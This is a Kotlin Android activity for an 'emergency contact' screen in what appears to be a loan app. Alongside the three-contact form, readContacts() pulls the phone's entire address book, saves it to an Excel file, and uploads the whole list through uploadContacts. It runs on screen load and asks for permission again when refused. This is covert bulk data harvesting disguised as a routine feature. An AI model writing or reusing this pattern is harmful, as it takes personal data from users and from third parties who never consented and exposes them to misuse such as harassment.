package com.annis.dk.ui.emergency_contact

import android.Manifest
import android.database.Cursor
import android.os.Bundle
import android.provider.ContactsContract
import android.widget.Toast
import com.annis.baselib.base.base.TitleBean
import com.annis.baselib.base.mvp.MVPActivty
import com.annis.dk.R
import com.annis.dk.utils.ExcelUtil
import com.tbruyelle.rxpermissions2.RxPermissions
import kotlinx.android.synthetic.main.activity_emergency_contact.*
import java.io.File

class EmergencyContactActivity : MVPActivty<EmergencyContactPresenter>(), EmergencyContactView {
    override fun upSuccess() {
        showToast("上传成功")
        finish()
    }

    override fun getPresenter(): EmergencyContactPresenter {
        return EmergencyContactPresenter(this)
    }

    override fun getMyTitle(): TitleBean {
        return TitleBean("紧急联系人").setBack(true)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_emergency_contact)
    }

    var account: String? = null
    override fun initViewAndListener() {
        account = intent.getStringExtra("account")
        click()
        checkPermision()
    }

    fun click() {
        act_bt_change.setOnClickListener {
            presenter.uploadEmergencyConyact(
                contact_1_name.text.toString(), contact_1_relation.text.toString(), contact_1_mobel.text.toString(),
                contact_2_name.text.toString(), contact_2_relation.text.toString(), contact_2_mobel.text.toString(),
                contact_3_name.text.toString(), contact_3_relation.text.toString(), contact_3_mobel.text.toString()
            )
        }
    }

    private fun checkPermision() {
        //没有权限时，调用requestPermission方法，弹出权限申请对话框 ，回调OnRequestPermissionRelust函数

        var permissions = RxPermissions(this)

        val granted = permissions.isGranted(Manifest.permission.READ_CONTACTS)
        if (granted) {
            readContacts()
        } else {
            val subscribe = permissions.requestEach(Manifest.permission.READ_CONTACTS)
                .subscribe {
                    if (it.granted) {
                        readContacts()
                    } else if (it.shouldShowRequestPermissionRationale) {
                        // Denied permission without ask never again
                        Toast.makeText(this, "请同意申请", Toast.LENGTH_SHORT).show()
                        checkPermision()
                    } else {

                    }
                }
        }
    }

    var list: ArrayList<String> = arrayListOf()
    var FileDir: String? = null
    private fun readContacts() {
        var cursor: Cursor? = null
        try {
            //cursor指针 query询问 contract协议 kinds种类
            cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            if (cursor != null) {
                while (cursor!!.moveToNext()) {
                    val displayName =
                        cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number =
                        cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    list.add(displayName + DIVISION + number)
                }
                //保存文件
                var filePath = saveToExcle(externalCacheDir, account ?: "contact", list)
                getPresenter().uploadContacts(list)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            if (cursor != null) {
                cursor!!.close()
            }
        }
    }

    val DIVISION = "ec-ec"
    fun saveToExcle(dir: File, name: String, list: ArrayList<String>): String {
        //文件夹是否已经存在
        if (!dir.exists()) {
            dir.mkdirs()
        }

        var title = arrayOf("姓名", "电话")
        var fileName = File(dir, "$name.xls")
        ExcelUtil.initExcel(fileName, title)
        ExcelUtil.writeObjListToExcel<String>(this, list, fileName.absolutePath, object : ExcelUtil.Transform<String> {
            override fun getColumn(t: String?): MutableList<String> {
                return arrayListOf(t!!.split(DIVISION)[0], t!!.split(DIVISION)[1])
            }
        })
        return fileName.absolutePath
    }
}